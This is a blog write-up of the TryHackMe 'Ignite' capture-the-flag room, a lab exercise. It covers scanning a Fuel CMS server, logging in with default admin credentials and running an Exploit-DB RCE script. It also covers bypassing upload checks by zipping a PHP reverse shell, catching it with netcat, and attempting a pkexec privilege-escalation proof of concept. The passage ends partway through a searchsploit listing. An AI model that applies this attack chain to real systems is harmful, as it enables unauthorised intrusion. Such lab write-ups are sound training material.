<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="THM:ignite" /><meta name="author" content="r0bsec" /><meta property="og:locale" content="en" /><meta name="description" content="ignite" /><meta property="og:description" content="ignite" /><link rel="canonical" href="https://r0bsec.github.io/writeups/ignite/" /><meta property="og:url" content="https://r0bsec.github.io/writeups/ignite/" /><meta property="og:site_name" content="r0bsec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-08-17T22:44:52+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="THM:ignite" /><meta name="twitter:site" content="@" /><meta name="twitter:creator" content="@r0bsec" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"r0bsec"},"dateModified":"2023-08-17T22:44:52+00:00","datePublished":"2023-08-17T22:44:52+00:00","description":"ignite","headline":"THM:ignite","mainEntityOfPage":{"@type":"WebPage","@id":"https://r0bsec.github.io/writeups/ignite/"},"url":"https://r0bsec.github.io/writeups/ignite/"}</script><title>THM:ignite | r0bsec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="r0bsec"><meta name="application-name" content="r0bsec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><body><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"> <img src="/assets/img/favicons/favicon-32x32.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"> </a><div class="site-title"> <a href="/">r0bsec</a></div><div class="site-subtitle fst-italic">Cybersecurity fun and games</div></div><ul class="nav flex-column flex-grow-1 w-100 ps-0"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/writeups/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>WRITEUPS</span> </a></ul><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/r0bsec" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container px-xxl-5"><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100" > <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>THM:ignite</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> THM:ignite</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div class="row mb-5"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pe-xl-4"><div class="post px-1 px-md-2"><h1 class="dynamic-title"> THM:ignite</h1><div class="post-content"><p>ignite</p><p>URL: <a href="https://tryhackme.com/room/ignite">https://tryhackme.com/room/ignite</a> [Easy]</p><hr /><h2 id="reconnaissance"><span class="me-2">Reconnaissance</span><a href="#reconnaissance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Description of the room:</p><blockquote><p>A new start-up has a few issues with their web server.</p></blockquote><h2 id="scanning"><span class="me-2">Scanning</span><a href="#scanning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="running-nmap"><span class="me-2">Running: <code class="language-plaintext highlighter-rouge">nmap</code></span><a href="#running-nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Ran the following:</p><blockquote><p><code class="language-plaintext highlighter-rouge">nmap x.x.x.x</code></p></blockquote><p>Interesting ports found to be open:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>
</pre></table></code></div></div><p>No SSH! Looks like we’re going to have to do everything through the web server.</p><p>Also see: <a href="nmap.log">nmap.log</a></p><h3 id="running-gobuster"><span class="me-2">Running: <code class="language-plaintext highlighter-rouge">gobuster</code></span><a href="#running-gobuster" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Ran the following:</p><blockquote><p><code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://x.x.x.x</code></p></blockquote><p>Interesting folders found:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="o">/</span><span class="nf">index                </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">16595</span><span class="p">]</span>
<span class="o">/</span><span class="nf">home                 </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">16595</span><span class="p">]</span>
<span class="o">/</span><span class="nf">assets               </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">313</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">88.210</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="p">]</span>
<span class="o">/</span><span class="nf">offline              </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">70</span><span class="p">]</span>       
</pre></table></code></div></div><p>These are a bust. The main page shows a setup page for this “Fuel CMS” app.</p><p>Also see: <a href="gobuster.log">gobuster.log</a></p><h3 id="running-nikto"><span class="me-2">Running: <code class="language-plaintext highlighter-rouge">nikto</code></span><a href="#running-nikto" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Ran the following:</p><blockquote><p><code class="language-plaintext highlighter-rouge">nikto -h x.x.x.x</code></p></blockquote><p>Interesting info found:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">+</span> <span class="n">Entry</span> <span class="sh">'</span><span class="s">/fuel/</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">robots</span><span class="p">.</span><span class="n">txt</span> <span class="n">returned</span> <span class="n">a</span> <span class="n">non</span><span class="o">-</span><span class="n">forbidden</span> <span class="ow">or</span> <span class="n">redirect</span> <span class="n">HTTP</span> <span class="nf">code </span><span class="p">(</span><span class="mi">302</span><span class="p">)</span>
<span class="o">+</span> <span class="sh">"</span><span class="s">robots.txt</span><span class="sh">"</span> <span class="n">contains</span> <span class="mi">1</span> <span class="n">entry</span> <span class="n">which</span> <span class="n">should</span> <span class="n">be</span> <span class="n">manually</span> <span class="n">viewed</span><span class="p">.</span>
<span class="o">+</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">18</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="nf">outdated </span><span class="p">(</span><span class="n">current</span> <span class="ow">is</span> <span class="n">at</span> <span class="n">least</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">37</span><span class="p">).</span> <span class="n">Apache</span> <span class="mf">2.2</span><span class="p">.</span><span class="mi">34</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">EOL</span> <span class="k">for</span> <span class="n">the</span> <span class="mf">2.</span><span class="n">x</span> <span class="n">branch</span><span class="p">.</span>
</pre></table></code></div></div><p>Also see: <a href="nikto.log">nikto.log</a></p><h2 id="gaining-access"><span class="me-2">Gaining Access</span><a href="#gaining-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Simply reading the main <code class="language-plaintext highlighter-rouge">/</code> page of the website, at the bottom, we see that this “Fuel CMS” isn’t fully set up, so it <strong>includes the default admin credentials to log in</strong>. From the <code class="language-plaintext highlighter-rouge">/robots.txt</code>, it looks like the <code class="language-plaintext highlighter-rouge">/fuel/</code> folder is where the app lives - so we can go there to log in, as admin!</p><p>It’s basically an empty installation with no users and no content. Where to begin, to get a bash prompt?</p><h3 id="option-1-searchsploit"><span class="me-2">Option 1: <code class="language-plaintext highlighter-rouge">searchsploit</code></span><a href="#option-1-searchsploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can run:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>searchsploit <span class="s2">"fuel cms"</span>
</pre></table></code></div></div><p>And find some candidates:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="o">-------------------------------------------------------------------</span> <span class="o">-------------------------</span>
 <span class="n">Exploit</span> <span class="n">Title</span>                                                    <span class="o">|</span>  <span class="n">Path</span>
<span class="o">-------------------------------------------------------------------</span> <span class="o">-------------------------</span>
<span class="n">fuel</span> <span class="n">CMS</span> <span class="mf">1.4</span><span class="p">.</span><span class="mi">1</span> <span class="o">-</span> <span class="n">Remote</span> <span class="n">Code</span> <span class="nc">Execution </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                        <span class="o">|</span> <span class="n">linux</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="mf">47138.</span><span class="n">py</span>
<span class="n">Fuel</span> <span class="n">CMS</span> <span class="mf">1.4</span><span class="p">.</span><span class="mi">1</span> <span class="o">-</span> <span class="n">Remote</span> <span class="n">Code</span> <span class="nc">Execution </span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>                        <span class="o">|</span> <span class="n">php</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="mf">49487.</span><span class="n">rb</span>
<span class="n">Fuel</span> <span class="n">CMS</span> <span class="mf">1.4</span><span class="p">.</span><span class="mi">1</span> <span class="o">-</span> <span class="n">Remote</span> <span class="n">Code</span> <span class="nc">Execution </span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>                        <span class="o">|</span> <span class="n">php</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="mf">50477.</span><span class="n">py</span>
<span class="n">Fuel</span> <span class="n">CMS</span> <span class="mf">1.4</span><span class="p">.</span><span class="mi">13</span> <span class="o">-</span> <span class="sh">'</span><span class="s">col</span><span class="sh">'</span> <span class="n">Blind</span> <span class="n">SQL</span> <span class="nc">Injection </span><span class="p">(</span><span class="n">Authenticated</span><span class="p">)</span>       <span class="o">|</span> <span class="n">php</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="mf">50523.</span><span class="n">txt</span>
<span class="n">Fuel</span> <span class="n">CMS</span> <span class="mf">1.4</span><span class="p">.</span><span class="mi">7</span> <span class="o">-</span> <span class="sh">'</span><span class="s">col</span><span class="sh">'</span> <span class="n">SQL</span> <span class="nc">Injection </span><span class="p">(</span><span class="n">Authenticated</span><span class="p">)</span>              <span class="o">|</span> <span class="n">php</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="mf">48741.</span><span class="n">txt</span>
<span class="n">Fuel</span> <span class="n">CMS</span> <span class="mf">1.4</span><span class="p">.</span><span class="mi">8</span> <span class="o">-</span> <span class="sh">'</span><span class="s">fuel_replace_id</span><span class="sh">'</span> <span class="n">SQL</span> <span class="nc">Injection </span><span class="p">(</span><span class="n">Authenticated</span><span class="p">)</span>  <span class="o">|</span> <span class="n">php</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="mf">48778.</span><span class="n">txt</span>
<span class="o">-------------------------------------------------------------------</span> <span class="o">-------------------------</span>
<span class="n">Shellcodes</span><span class="p">:</span> <span class="n">No</span> <span class="n">Results</span>
</pre></table></code></div></div><p><em>Also see: <a href="./searchsploit.log">searchsploit.log</a></em></p><p>In my case, I chose the <code class="language-plaintext highlighter-rouge">50477.py</code> file (these are located in <code class="language-plaintext highlighter-rouge">/usr/share/exploitdb/exploits/</code>). To run this, I copied this Python script to my <a href="50477.py">local folder</a>, then run:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 ./50477.py <span class="nt">-u</span> http://x.x.x.x
</pre></table></code></div></div><p>This prompts you with a <code class="language-plaintext highlighter-rouge">Enter Command $</code> prompt. You type in something to run, and it gives you the results. You could for example send it:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cat</span> /home/www-data/flag.txt
</pre></table></code></div></div><p>After seeing in the <code class="language-plaintext highlighter-rouge">/home</code> folder there is a <code class="language-plaintext highlighter-rouge">www-data</code> folder, and using <code class="language-plaintext highlighter-rouge">whoami</code> to see that we are logged in as user <code class="language-plaintext highlighter-rouge">www-data</code>.</p><p>This approach isn’t great though because we don’t actually have a shell prompt, and we’re kind of limited on what we could do. You might explore the other RCE’s listed above, or you could try to do other one-liners to get a reverse shell - but I decided to also check out this website for other ways in.</p><h3 id="option-2-file-upload-bypass"><span class="me-2">Option 2: File Upload Bypass</span><a href="#option-2-file-upload-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Within this “Fuel CMS” website, where I’m logged in as the <code class="language-plaintext highlighter-rouge">admin</code> account (<em>you did see the clear-text credentials on the main <code class="language-plaintext highlighter-rouge">/</code> page, right?</em>) - there is an “Assets” screen (see <code class="language-plaintext highlighter-rouge">/fuel/assets</code>) for uploading and downloading files.</p><p>This could be useful for:</p><ul><li><strong>Uploading</strong> and executing a reverse shell (if we can get past their validation). We can also use this to upload other useful files like <a href="https://github.com/carlospolop/PEASS-ng">linpeas.sh</a>. Note that this THM machine does NOT have outbound Internet access!<li><strong>Downloading</strong> or exfiltrating data. By simplying staging your files into <code class="language-plaintext highlighter-rouge">/var/www/html/assets/images</code> for example, that file will be viewable/downloadable from the <code class="language-plaintext highlighter-rouge">/fuel/assets</code> screen. You could create a <code class="language-plaintext highlighter-rouge">.zip</code> of interesting data, and then just download it from your browser.</ul><p>We try to upload a <code class="language-plaintext highlighter-rouge">.php</code> file and it’s blocked. Same with our <code class="language-plaintext highlighter-rouge">linpeas.sh</code>. However, two things are notable:</p><ol><li>The validation seems to be different between the “Docs” upload and the “Images” upload. There seems to be less-validation on the “Images” upload. So, let’s upload our stuff there.<li>The upload screen has the ability to “unzip” the contents. It also doesn’t seem to do any validation for files that are within a <code class="language-plaintext highlighter-rouge">.zip</code> file. So, we can put our <code class="language-plaintext highlighter-rouge">.php</code> or <code class="language-plaintext highlighter-rouge">.sh</code> file into a <code class="language-plaintext highlighter-rouge">.zip</code> folder - get past the validation, and then it unzips our contents on the server!</ol><p>With that said, we have enough to at least get unprivileged access.</p><h3 id="unprivileged-access"><span class="me-2">Unprivileged Access</span><a href="#unprivileged-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The procedure / attack-chain / kill-chain to get an unprivileged reverse shell would be:</p><ol><li><strong>Download a Reverse Shell</strong> - since this is a PHP website, I used the <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentestmonkey</a> one.<li><strong>Modify</strong> - in the <code class="language-plaintext highlighter-rouge">.php</code> file, you should specify the IP address of your workstation, and the port where you will be listening for a session (e.g. <code class="language-plaintext highlighter-rouge">9999</code>).<li><strong>Rename and .zip</strong> - I don’t know if there is other input validation. So, I tend to have better luck using the <code class="language-plaintext highlighter-rouge">.phtml</code> file extension instead of <code class="language-plaintext highlighter-rouge">.php</code>. So, we rename the reverse shell and create a zip using 7zip with: <code class="language-plaintext highlighter-rouge">7z a ./php-reverse-shell.zip ./php-reverse-shell.phtml</code><li><strong>Upload</strong> - the <code class="language-plaintext highlighter-rouge">./php-reverse-shell.zip</code> file to the “Images” folder, choose to “Unzip zip files”<li><strong>Start Netcat</strong> - on your workstation, run <code class="language-plaintext highlighter-rouge">nc -lvnp 9999</code> and start listening for a session.<li><strong>Execute</strong> - in the Fuel CMS screen <code class="language-plaintext highlighter-rouge">/fuel/assets</code>, switch to “Images”, and click on the <code class="language-plaintext highlighter-rouge">php-reverse-shell.phtml</code>. You should instantly get a session over on Netcat, and the browser tab where you clicked the script should hang.</ol><h4 id="upgrade-the-connection"><span class="me-2">Upgrade the Connection</span><a href="#upgrade-the-connection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>You can get a slightly better bash prompt in Netcat by running:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
</pre></table></code></div></div><p>To make it a notch better, do <kbd>CTRL</kbd>+<kbd>Z</kbd>, then type:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">stty </span>raw <span class="nt">-echo</span> <span class="p">;</span> <span class="nb">fg</span>
</pre></table></code></div></div><p>That will give you a more stable prompt. It’s not as good as an SSH session, but it’s better than raw input/output.</p><p>From here, you might see there is a <code class="language-plaintext highlighter-rouge">www-data</code> home directory under <code class="language-plaintext highlighter-rouge">/home/</code> and that is where you’ll find the user flag for this THM room.</p><h3 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Using a similar technique as above, we can send <code class="language-plaintext highlighter-rouge">linpeas.sh</code> up onto the server.</p><ol><li><strong>Download Linpeas</strong> - from here <a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a>.<li><strong>Create a .zip</strong> - Create a zip using 7zip with: <code class="language-plaintext highlighter-rouge">7z a ./linpeas.zip ./linpeas.sh</code><li><strong>Upload</strong> - the <code class="language-plaintext highlighter-rouge">./linpeas.zip</code> file to the “Images” folder, choose to “Unzip zip files”</ol><p>Now, using your unprivileged prompt from above, you can navigate to: <code class="language-plaintext highlighter-rouge">/var/www/html/assets/images</code> and run the script. Because we have a degraded shell (working over netcat), I want to run Linpeas, see the output, but also capture the output to a file, so I do this:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./linpeas.sh | <span class="nb">tee</span> ./linpeas.log
</pre></table></code></div></div><p><em>Also see: <a href="./linpeas.log">linpeas.log</a></em></p><blockquote><h3 id="pro-tip"><span class="me-2">PRO TIP:</span><a href="#pro-tip" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>By doing this in the same <code class="language-plaintext highlighter-rouge">images</code> folder, I can actually download and view that log file on my local workstation, which at the moment is a somewhat better way to view the results. Linpeas has a colorful output that isn’t very readable as plain-text.</p></blockquote><h4 id="linpeas-findings"><span class="me-2">Linpeas Findings</span><a href="#linpeas-findings" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The first notable thing is that this system is supposedly vulnerable to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-4034">CVE-2021-4034</a>. The description is:</p><blockquote><p>A local privilege escalation vulnerability was found on polkit’s pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn’t handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it’ll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.</p></blockquote><p>Doing a search for a Proof Of Concept (POC), I found <a href="https://github.com/arthepsy/CVE-2021-4034">this one</a> (<a href="./cve-2021-4034-poc.c">cve-2021-4034-poc.c</a>). You compile it on your workstation with:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gcc cve-2021-4034-poc.c <span class="nt">-o</span> cve-2021-4034-poc
</pre></table></code></div></div><p>Then, similar to above, create a zip with <code class="language-plaintext highlighter-rouge">7z a ./cve-2021-4034.zip ./cve-2021-4034-poc</code>. Upload that into the “Images” folder.</p><p>Finally, from your Netcat prompt, switch to that same <code class="language-plaintext highlighter-rouge">/var/www/html/assets/images</code> folder, and then execute the exploit:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./cve-2021-4034-poc
</pre></table></code></div></div><p>Unfortunately, I got output like this:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>bash: ./cve-2021-4034-poc: Permission denied
</pre></table></code></div></div><p><a href="https://github.com/arthepsy/CVE-2021-4034/issues/5#issuecomment-1033743533">Upon further research</a> like <a href="https://nsfocusglobal.com/linux-polkit-privilege-escalation-vulnerability-cve-2021-4034/">here for example</a>, it turns out this vulnerability fixed in <code class="language-plaintext highlighter-rouge">pkexec</code> version <code class="language-plaintext highlighter-rouge">0.105</code>, which is the exact version I have (running: <code class="language-plaintext highlighter-rouge">pkexec --version</code>).</p><blockquote><p><strong>Looks like this is a false-positive for Linpeas.</strong></p></blockquote><p>NEXT, from the <a href="./linpeas.log">Linpeas output</a>, it’s also mentioning that we have an older version of <code class="language-plaintext highlighter-rouge">sudo</code> (version <code class="language-plaintext highlighter-rouge">1.8.16</code>). So, back to <code class="language-plaintext highlighter-rouge">searchsploit</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>searchsploit <span class="nb">sudo</span>
</pre></table></code></div></div><p>We get a bunch of findings here:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>---------------------------------------------------------------------------------------- -------------------------
 Exploit Title     |  Path
---------------------------------------------------------------------------------------- -------------------------
(Tod Miller's) Sudo/SudoEdit 1.6.9p21/1.7.2p4 - Local Privilege Escalation             | multiple/local/11651.sh
Apple Mac OSX - Sudo Password Bypass (Metasploit)                                      | osx/local/27944.rb
Battery Life Toolkit 1.0.9 - 'bltk_sudo' Local Privilege Escalation                    | linux/local/33576.txt
ptrace - Sudo Token Privilege Escalation (Metasploit)                                  | linux/local/47345.rb
RedStar 3.0 Desktop - Enable sudo Privilege Escalation                                 | linux/local/35746.sh
Sudo 1.3.1 &lt; 1.6.8p (OpenBSD) - Pathname Validation Privilege Escalation               | bsd/local/1087.c
Sudo 1.5/1.6 - Heap Corruption                                                         | linux/local/20901.c
Sudo 1.6.3 - Unclean Environment Variable Privilege Escalation                         | linux/local/21227.sh
Sudo 1.6.8 - Information Disclosure                                                    | linux/local/24606.c
Sudo 1.6.8p9 - SHELLOPTS/PS4 Environment Variables Privilege Escalation                | linux/local/1310.txt
Sudo 1.6.9p18 - 'Defaults SetEnv' Local Privilege Escalation                           | multiple/local/7129.sh
Sudo 1.6.x - Environment Variable Handling Security Bypass (1)                         | linux/local/27056.pl
Sudo 1.6.x - Environment Variable Handling Security Bypass (2)                         | linux/local/27057.py
Sudo 1.6.x - Password Prompt Heap Overflow                                             | linux/local/21420.c
